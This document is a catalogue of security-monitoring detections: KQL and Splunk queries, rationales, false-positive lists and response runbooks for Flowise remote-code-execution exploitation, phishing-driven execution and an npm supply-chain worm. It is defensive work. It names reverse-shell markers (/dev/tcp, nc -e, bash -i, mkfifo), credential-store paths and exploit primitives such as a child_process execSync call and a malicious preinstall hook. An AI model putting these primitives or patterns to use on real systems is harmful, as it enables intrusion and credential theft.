Flowise node runtime spawns shell interpreter (post-exploit command execution) AIExploitation Medium
Detects the Flowise node process spawning bash/sh/dash/zsh (or cmd/powershell) — behaviour Flowise never exhibits in normal operation, indicating command execution following CVE-2026-69259 exploitation (e.g. via a TypeORM entities JS payload loaded through additionalConfig). Rationale: The advisory is titled an RCE; a normal Flowise node server does not fork interactive shells, so node -> bash/sh/powershell (especially with -c, /dev/tcp, curl/wget/nc, or base64 tokens) is a strong post-exploitation indicator. Parent-child pairing (node parent) plus suspicious-arg tokens keeps fidelity up. Cross-checked against: • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html • https://www.securityweek.com/exploit-code-published-for-critical-flowise-rce-vulnerability/
ATT&CKT1059.004 T1059.001 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Flowise Tool/Custom-Function node that legitimately shells out (e.g. an admin-authored code-interpreter tool)
  • Container healthcheck or entrypoint wrapper invoking sh -c at startup
  • npm lifecycle scripts running sh during in-container package install/upgrade
  • Monitoring agents embedded in the image spawning sh for metric collection
Suppression filter
| where not (ProcessCommandLine has "npm" and InitiatingProcessCommandLine has_any ("install", "ci", "run"))
Response runbook
1) Triage: inspect the child ProcessCommandLine — reverse-shell (/dev/tcp, nc -e), downloader (curl|wget), or base64 blob confirms exploitation; benign `sh -c` from a known custom tool node may be expected. Identify the initiating node PID and its network peers. 2) Contain: kill the child process, isolate the container/host, block any outbound C2 IP, and revoke Flowise API keys; patch to 3.1.3+. 3) Hunt: correlate with preceding upsert API requests and node file-writes (companion UCs), and sweep other Flowise hosts for the same node->shell pattern.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node", "nodejs")
| where FileName in~ ("bash", "sh", "dash", "zsh", "cmd.exe", "powershell.exe", "pwsh")
| where ProcessCommandLine has_any ("-c", "/dev/tcp/", "curl ", "wget ", "nc ", " -i", "base64", "python", "/tmp/") or FileName in~ ("cmd.exe", "powershell.exe", "pwsh")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessId, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| sort by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has "node"
| where ActingProcessName has_any ("bash", "/sh", "dash", "zsh", "cmd.exe", "powershell", "pwsh")
| where ActingProcessCommandLine has_any ("-c", "/dev/tcp/", "curl ", "wget ", "nc ", " -i", "base64", "python", "/tmp/") or ActingProcessName has_any ("cmd.exe", "powershell")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| sort by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Attachment delivery + execution by recipient — most common malware initial access.

Flowise node.js spawns Unix shell/command binaries as root (CSVAgent Pyodide RCE) AIExploitation High
Hunts the core of CVE-2026-69255: the Flowise node.js process using Pyodide's js bridge to call process.mainModule.constructor._load('child_process').execSync() and spawn OS commands as root (PID 1 in container). A node process that is a Flowise workflow engine should never fork /bin/sh, id, uname, or whoami — that child is the injected payload executing. Rationale: Grounded in the verified chain (process.mainModule.constructor._load('child_process').execSync('id') as root, PID 1). A node parent forking a shell/recon binary is the direct RCE observable; requiring AccountName=root matches the article's verified 'Server username: root'. Cross-checked GHSA-9wc7-mj3f-74xv / CVE-2026-41264 confirming the same CSVAgent→pyodide→child_process path. Cross-checked against: • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9wc7-mj3f-74xv • https://advisories.gitlab.com/npm/flowise/CVE-2026-41264/ • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html
ATT&CKT1190 T1059.006 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Flowise/LangChain nodes that legitimately shell out to a Python tool via a custom Tool node (env, python3)
  • Container entrypoint/health-check scripts where node is the init process invoking sh at startup
  • CI/build images where node runs as root and calls git/curl during package install
  • Admin exec-ing into the container and running id/uname for troubleshooting (parent would be sh, not node)
Suppression filter
| where not (ProcessCommandLine has_any ("node_modules","npm","yarn","pnpm","/healthz","docker-entrypoint") and FileName in~ ("sh","bash"))
Response runbook
1) TRIAGE: Pull the child ProcessCommandLine and the InitiatingProcessCommandLine — a raw `id`/`uname`/`sh -c` with no Flowise tool wrapper, executed as root under a node parent, is a true positive. Confirm the host runs Flowise <=3.1.2. 2) CONTAIN: Isolate/kill the container, rotate FLOWISE_PASSWORD and any API keys under /root/.flowise, and block the source IP hitting /api/v1/prediction. 3) HUNT: On the same host pivot to outbound connections from node/sh (reverse shell UC), reads of /root/.flowise and /etc/passwd, and the upstream POST /api/v1/chatflows + /api/v1/prediction requests that delivered the payload.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where FileName in~ ("sh","bash","dash","id","uname","whoami","cat","env","curl","wget","python3")
| where AccountName == "root" or InitiatingProcessAccountName == "root"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node","nodejs")
| where ActingProcessName has_any ("/sh","/bash","/dash","/id","/uname","/whoami","/cat","/env","/curl","/wget","/python3")
| where ActorUsername == "root" or TargetUsername == "root"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Reverse shell / Meterpreter egress from Flowise node or its shell child AICommand & Control Medium
Hunts the verified Meterpreter reverse_tcp session by flagging outbound public connections initiated by the Flowise node process or a shell it spawned, on ports other than normal web/DNS. Port-agnostic (not tied to the article's 4444) so it survives operator payload changes. Rationale: Article verifies a Meterpreter session opened from the exploited node process (172.17.0.2 -> 172.17.0.1:4444). Pivoting on node/shell as the initiating process to a public IP on a non-web port catches the reverse shell without hardcoding the port. Sentinel left empty: ImNetworkSession carries no process attribution, so the node/shell parent constraint cannot be expressed on available Sentinel tables. Cross-checked against: • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9wc7-mj3f-74xv • https://www.securityweek.com/exploit-code-published-for-critical-flowise-rce-vulnerability/amp/
ATT&CKT1571 T1059.004
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Flowise node making outbound LLM/vector-DB API calls on non-standard ports (e.g. self-hosted Ollama :11434, Qdrant :6333)
  • node connecting to a database backend (Postgres :5432, MySQL :3306)
  • Monitoring/APM agents launched by node (StatsD/OTLP ports)
  • Package registry pulls over a proxy on a custom port during container build
Suppression filter
| where RemoteIP !in ("127.0.0.1") and not (InitiatingProcessFileName in~ ("node","nodejs") and RemotePort in (11434, 6333, 5432, 3306, 6379))
Response runbook
1) TRIAGE: Resolve RemoteIP ownership and reputation; a public IP with no PTR/vendor mapping reached from a freshly-spawned sh child of node is high-confidence C2. Check for a preceding node->sh spawn (UC1). 2) CONTAIN: Kill the container, blackhole the RemoteIP at the egress firewall, and capture memory if IR requires the Meterpreter stager. 3) HUNT: Search for the same RemoteIP/ASN across other Flowise hosts and for staged download commands (curl/wget) in node child command lines.

| where ActionType == "ConnectionSuccess"

System-recon commands executed under Flowise node/shell context AIActions on Objectives Medium
Hunts the post-exploitation discovery burst the PoC demonstrates (id, uname -a, cat /etc/hostname) run as children of node or a node-spawned shell. Targets both recon binaries and reads of sensitive host files that reveal container/host identity. Rationale: PoC output shows id, uname -a and cat /etc/hostname run immediately after the shell opens. Requiring a node/shell parent plus >=2 distinct recon actions distinguishes attacker enumeration from a single benign uname. /root/.flowise and /etc/passwd are the exact sensitive targets the article names. Cross-checked against: • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9wc7-mj3f-74xv
ATT&CKT1082 T1033
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Container entrypoint scripts running uname/hostname to set labels
  • Health checks or app code that reads /etc/hostname for self-identification
  • Ops staff running id/whoami after exec-ing into the container
  • Backup/monitoring jobs that grep /etc/passwd for account inventory
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("docker-entrypoint","healthcheck","/entrypoint.sh") )
Response runbook
1) TRIAGE: Look at command ordering and timing — id -> uname -> cat /etc/hostname within seconds under a node-spawned shell is hands-on-keyboard recon, not a startup script. 2) CONTAIN: Snapshot then isolate the container; preserve shell history. 3) HUNT: Follow with credential-store access (UC4) and outbound C2 (UC2) from the same PID/host, and review who triggered the originating /api/v1/prediction call.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs","sh","bash","dash")
| where (FileName in~ ("id","uname","whoami","hostname","env"))
     or (FileName in~ ("cat","head","grep") and ProcessCommandLine has_any ("/etc/passwd","/etc/hostname","/root/.flowise"))
| summarize FirstSeen=min(Timestamp), DistinctCmds=dcount(FileName), Cmds=make_set(ProcessCommandLine, 20) by DeviceName, InitiatingProcessFileName, AccountName
| where DistinctCmds >= 2
| order by FirstSeen desc
ImProcessCreate
| where TimeGenerated > ago(7d)

Access to Flowise credential store /root/.flowise and secret env vars AIActions on Objectives Medium
Hunts the verified credential theft: reads of the Flowise SQLite/config store at /root/.flowise (DATABASE_PATH) and dumping of FLOWISE_PASSWORD / APIKEY_PATH secrets from a node-spawned shell. These exact strings appear in the article's post-exploitation output. Rationale: The article's 'Additional Verified Impact / Credential Theft' block names FLOWISE_PASSWORD, DATABASE_PATH=/root/.flowise and APIKEY_PATH verbatim. These are high-fidelity literals; a shell child of node referencing them is credential harvesting, not normal Flowise operation (the app reads its own DB via the node process, not via cat/grep). Cross-checked against: • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9wc7-mj3f-74xv
ATT&CKT1552.001 T1552
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate backup/migration scripts that tar or copy /root/.flowise
  • Ops staff grepping env for DATABASE_PATH during troubleshooting
  • Container entrypoint exporting FLOWISE_PASSWORD/DATABASE_PATH at startup (parent would be the init shell, not node)
  • Config-management tooling templating the Flowise env file
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("docker-entrypoint","/entrypoint.sh","backup","rsync","tar "))
Response runbook
1) TRIAGE: Confirm the accessing process is a shell child of node rather than the entrypoint; a cat/grep of /root/.flowise from an interactive-looking shell is theft. 2) CONTAIN: Immediately rotate FLOWISE_PASSWORD, the SQLite DB credentials and every API key stored under /root/.flowise and APIKEY_PATH; revoke downstream tokens (OpenAI, vector DB). 3) HUNT: Check outbound transfers (UC2) that could have exfiltrated the store, and review auth logs for the leaked admin password being reused elsewhere.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs","sh","bash","dash")
| where ProcessCommandLine has_any ("/root/.flowise", "FLOWISE_PASSWORD", "APIKEY_PATH", "DATABASE_PATH")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node","nodejs","sh","bash","dash")
| where ActingProcessCommandLine has_any ("/root/.flowise", "FLOWISE_PASSWORD", "APIKEY_PATH", "DATABASE_PATH")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Flowise CSVAgent exploit HTTP sequence: chatflow create + prediction trigger AIExploitation Medium
Hunts the delivery pattern for CVE-2026-69255 at the web tier: an authenticated client creating a chatflow (POST /api/v1/chatflows) then invoking it (POST /api/v1/prediction/<UUID>) — the two-request pattern every public PoC/Metasploit module uses to plant and fire the CSVAgent payload. Rationale: External corroboration (GHSA-9wc7-mj3f-74xv, GitLab GLAD) confirms exploitation = POST /api/v1/chatflows to create the malicious CSVAgent flow, then POST /api/v1/prediction/<UUID> to execute it. Requiring both endpoints from one source in a window is the article-specific delivery fingerprint. Defender/Datadog/Falcon left empty: this is web-proxy telemetry with no clean endpoint-EDR or CloudTrail equivalent. Cross-checked against: • https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9wc7-mj3f-74xv • https://advisories.gitlab.com/npm/flowise/GHSA-9wc7-mj3f-74xv/ • https://gbhackers.com/six-flowise-vulnerabilities/
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Flowise builders creating and testing chatflows during normal development
  • Automated CI/CD or IaC that programmatically provisions chatflows then smoke-tests them via /prediction
  • Load-testing or synthetic-monitoring hitting the prediction API
  • A single power user rapidly iterating on a flow
Response runbook
1) TRIAGE: Pull the request bodies (if the proxy captures them) and look for the CSVAgent payload markers `import js`, `child_process`, `_load`, or `execSync` and the comma-free breakout `";import js`; correlate SourceIP with an authenticated session. 2) CONTAIN: Block the source IP, force-expire the attacker's Flowise session/token, and take the instance off the internet until patched to >=3.1.3. 3) HUNT: On the Flowise host, pivot to node->shell spawns (UC1), credential-store access (UC4) and reverse-shell egress (UC2) originating shortly after the /prediction call.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod == "POST"
| where RequestURL has "/api/v1/prediction/" or RequestURL has "/api/v1/chatflows"
| extend Endpoint = iff(RequestURL has "/api/v1/prediction/", "prediction", "chatflows")
| summarize FirstSeen=min(TimeGenerated), Endpoints=make_set(Endpoint), Hits=count() by SourceIP, DestinationHostName
| where set_has_element(Endpoints, "prediction") and set_has_element(Endpoints, "chatflows")
| order by FirstSeen desc

Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-69254: Flowise: RCE via NodeVM Sandbox Escape in exec
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Flowise/node process spawning Unix shell or netcat reverse shell (CVE-2026-69254 vm2 escape)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Reverse-shell egress from Flowise node process tree (nc/shell child dialing out)
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Flowise/node process spawning Unix shell or netcat reverse shell (CVE-2026-69254 vm2 escape) AIInstallation High
Hunts the on-host manifestation of the CVE-2026-69254 vm2 sandbox escape: the Flowise 'node' process spawning /bin/sh, bash, nc, ncat or socat with reverse-shell markers. A node-parent-to-shell edge carrying /dev/tcp or nc -e is the highest-fidelity signal of the escape reaching child_process. Rationale: Anchored on the article's exact escape endpoint (node child_process launching a reverse shell) and the PoC's nc pattern to 172.17.0.1:1337; node-parent-to-shell with /dev/tcp or nc -e is a rare, high-fidelity edge. Cross-checked vm2-escape-to-child_process behaviour against the vm2 advisory wave and Flowise active-exploitation reporting. Cross-checked against: • https://github.com/advisories/GHSA-3769-jgqc-cxm7 • https://thehackernews.com/2026/05/vm2-nodejs-library-vulnerabilities.html • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html • https://www.rapid7.com/db/modules/exploit/multi/http/flowise_js_rce/
ATT&CKT1211 T1059.004 T1059.007 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node-based build tooling (node-gyp, prebuild, npm/yarn lifecycle scripts) forking sh -c during image builds
  • Flowise/node worker legitimately shelling out to ffmpeg/imagemagick/git via child_process for document processing
  • Container healthcheck scripts using nc to test port reachability of a downstream service
  • Developer or CI running a node app interactively that spawns bash for a subprocess helper
Suppression filter
| where ProcessCommandLine !has_any ("node-gyp","prebuild","npm ","yarn ","node_modules/.bin","/usr/bin/ffmpeg","convert ","git ")
Response runbook
1) TRIAGE: Pull the full child ProcessCommandLine and the node parent's InitiatingProcessCommandLine; confirm the shell/nc invocation carries a reverse-shell shape (/dev/tcp, -e /bin/sh, mkfifo) and identify the remote endpoint. Check whether the host runs Flowise and is internet-reachable. 2) CONTAIN: Isolate the host/container, kill the node and child shell PIDs, and block the observed remote IP:port at the egress firewall. Rotate any secrets (E2B/API keys, DB creds) reachable from the Flowise process. 3) HUNT: Pivot on the node PID for outbound connections (UC2), review Flowise API/auth logs for the preceding AgentAsTool/baseURL config change, and search other Flowise hosts for the same parent-child edge.

| where InitiatingProcessFileName in~ ("node","nodejs")
| where FileName in~ ("sh","bash","dash","nc","ncat","netcat","nc.traditional","socat")
    or ProcessCommandLine has_any ("child_process","/dev/tcp/","-e /bin/sh","-e /bin/bash","bash -i","sh -i","mkfifo")
| where FileName in~ ("nc","ncat","netcat","nc.traditional","socat")
    or ProcessCommandLine has_any ("/dev/tcp/","-e /bin/sh","-e /bin/bash","bash -i","sh -i","mkfifo")
| where not(ProcessCommandLine has_any ("node-gyp","prebuild","npm ","yarn ","node_modules/.bin"))
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate

| where ParentProcessName has_any ("node","nodejs")
| where ActingProcessName has_any ("sh","bash","dash","nc","ncat","netcat","socat")
| where ActingProcessName has_any ("nc","ncat","netcat","socat")
    or ActingProcessCommandLine has_any ("/dev/tcp/","-e /bin/sh","-e /bin/bash","bash -i","sh -i","mkfifo","child_process")
| where not(ActingProcessCommandLine has_any ("node-gyp","prebuild","node_modules/.bin"))

Reverse-shell egress from Flowise node process tree (nc/shell child dialing out) AICommand & Control High
Hunts the C2 leg of CVE-2026-69254: an outbound TCP connection initiated by a shell, netcat, socat, python or perl process whose PARENT is node/Flowise. Interactive shells and netcat under a node service should not originate network connections, so this parent-scoped egress is a strong reverse-shell indicator regardless of the specific attacker IP. Rationale: Uses the article's reverse-shell C2 leg (nc/shell child of node connecting outbound, PoC to 172.17.0.1:1337); scoping the connecting process by node parentage keeps it Flowise-specific and durable to IP/port rotation. Sentinel left empty because its ASIM ImNetworkSession has no reliable acting-process attribution for Linux egress in this tenant, so the node-parent scoping cannot be expressed there. Cross-checked against: • https://github.com/advisories/GHSA-3769-jgqc-cxm7 • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html
ATT&CKT1571 T1059.004 T1219
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node app whose child python/perl helper legitimately fetches from an internal HTTP API on a non-standard port
  • Container init/entrypoint shell running curl-like health probes via nc to a service mesh sidecar
  • Monitoring/APM agent spawned under node that beacons to a collector on a custom port
  • Developer debugging a node service that manually launches python for an outbound test
Suppression filter
| where not (InitiatingProcessFileName in~ ("python","python3","perl") and RemoteIPType == "Private" and RemotePort in (8080, 8000, 9090))
Response runbook
1) TRIAGE: Confirm the connecting process is a shell/nc/socat whose parent is node and capture the remote IP:port; enrich the destination against threat intel and check if it is internal vs external. Correlate to a matching UC1 process-spawn hit on the same host/PID. 2) CONTAIN: Block the destination at egress, isolate the container/host, and terminate the node parent plus the connecting child. 3) HUNT: Sweep all Flowise hosts for the same shell-under-node egress shape, review Flowise auth and node-config API logs for the AgentAsTool baseURL injection that preceded it, and check for secondary tooling downloads over the channel.
DeviceNetworkEvents
| where Timestamp > ago(14d)
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName in~ ("nc","ncat","netcat","nc.traditional","socat","sh","bash","dash","python","python3","perl")
| where InitiatingProcessParentFileName in~ ("node","nodejs")
| where RemoteIPType == "Public" or RemotePort !in (80, 443, 53, 3000)
| project Timestamp, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, LocalPort
| order by Timestamp desc

Flowise API exploitation: path-traversal / JS-injection payloads to /api/v1 endpoints (CVE-2026-69254) AIDelivery Low
Hunts inbound exploitation of CVE-2026-69254 at the web tier: requests to a Flowise instance's /api/v1 (auth, tool-config, prediction) endpoints carrying the moment CVE-2022-24785 traversal string (../../../etc/passwd) or vm2/baseURL injection markers (nodeVMOptions, useSandbox, child_process). Requires a WAF/reverse proxy that inspects and logs request bodies, since the injection lands in the AgentAsTool baseURL JSON config. Rationale: Uses the article's concrete exploit primitives — the moment path-traversal string (../../../etc/passwd from CVE-2022-24785) and the AgentAsTool baseURL/nodeVMOptions injection surface — scoped to Flowise /api/v1 endpoints. Marked Low/hunting because the payload rides in the POST body, so it only surfaces where a WAF logs bodies (Message field); Defender/Datadog/Falcon left empty as none ship web-proxy body telemetry here. Cross-checked against: • https://github.com/advisories/GHSA-3769-jgqc-cxm7 • https://www.rapid7.com/db/modules/exploit/multi/http/flowise_js_rce/ • https://thehackernews.com/2026/04/flowise-ai-agent-builder-under-active.html
ATT&CKT1190 T1211
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Authenticated vulnerability scanners (Nessus, Qualys, Burp) probing the Flowise host with traversal and injection test strings
  • Internal red-team / pentest validation of CVE-2026-69254 against a staging Flowise instance
  • Legitimate AgentAsTool configs whose baseURL happens to contain encoded path segments
  • WAF replaying or logging blocked-request signatures that contain the traversal token from its own ruleset
Suppression filter
| where SourceIP !in ("10.0.0.0") and RequestClientApplication !has_any ("Nessus","Qualys","Nuclei","Burp","zgrab")
Response runbook
1) TRIAGE: Confirm the request targeted a real Flowise instance and whether it was allowed or blocked by the WAF; extract SourceIP, the endpoint, and the payload, and check whether the source is a sanctioned scanner. 2) CONTAIN: If unsanctioned and allowed, block the source IP at the WAF, and on the Flowise host check for the UC1/UC2 process-spawn and egress hits that would confirm the escape succeeded; isolate the host if so. 3) HUNT: Review Flowise auth logs for the POST /api/v1/auth/login that preceded the config change, enumerate AgentAsTool/ChatflowTool/ExecuteFlow nodes for injected baseURL values, and confirm the instance is patched past Flowise 3.1.1 / not running vm2 with useSandbox:false.

| where RequestURL has "/api/v1/" or DestinationServiceName has "flowise" or RequestURL has "prediction"
| where RequestURL has_any ("etc/passwd","../","..%2f","%2e%2e")

npm 'preinstall' hook auto-executing ChainDrop setup.mjs dropper AIInstallation High
Hunts the ChainDrop worm's entry point: a Node.js process launched by an npm install lifecycle that runs the 'setup.mjs' payload dropper referenced by the poisoned packages' "preinstall": "node setup.mjs" hook. Fires on developer workstations and CI/CD runners the instant an affected package version is installed. Rationale: Anchored on the exact package.json hook "preinstall": "node setup.mjs" and the dropper filename setup.mjs named in the article; pairing node+setup.mjs+npm-lifecycle parent makes it high-fidelity vs generic node runs.
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A benign package legitimately named or shipping a file called setup.mjs in a preinstall hook
  • Internal monorepo tooling that runs node against a local setup.mjs bootstrap script
  • Security researchers detonating the sample in a sandbox VM
  • CI pipelines re-installing dependencies after the package was already remediated (still worth triaging)
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("@yourorg/","internal-bootstrap") )
Response runbook
1) Triage: confirm the SHA256/path of setup.mjs and identify which npm package + version pulled it (check the nearest node_modules and package.json preinstall). Cross-ref against the Wiz/Aikido/Socket compromised-package lists. 2) Contain: isolate the workstation/CI runner from network, kill the node/bun process tree, and treat the host as fully compromised per vendor guidance. 3) Hunt: rotate ALL tokens accessible from that host (GitHub PATs ghp_/gho_/ghs_, npm_ tokens, AWS/K8s/Vault creds), then look for outbound npm-cache.com traffic and new GitHub repos described 'Shai-Hulud: Here We Go Again'.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("node.exe","node")
| where ProcessCommandLine has "setup.mjs"
| where InitiatingProcessFileName has_any ("npm","npm.cmd","node.exe","node","yarn","pnpm") or InitiatingProcessCommandLine has "preinstall"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","node.exe")

ChainDrop Bun runtime executing Math_Symbol.js / math_init.js infostealer AIActions on Objectives High
Hunts the second ChainDrop stage where setup.mjs downloads the Bun JavaScript runtime from GitHub and uses it to run the obfuscated Math_Symbol.js (or math_init.js) infostealer that harvests GitHub PATs, npm tokens, AWS/K8s/Vault/DB credentials. Targets the unusual 'bun' binary running one of the two named payload scripts. Rationale: Uses the article's exact execFileSync(<bun binary>, ['Math_Symbol.js']) behaviour plus the alternate payload filename math_init.js BleepingComputer observed; 'bun' running either script on a dev/CI host is a near-unique signal.
ATT&CKT1552.001 T1105 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
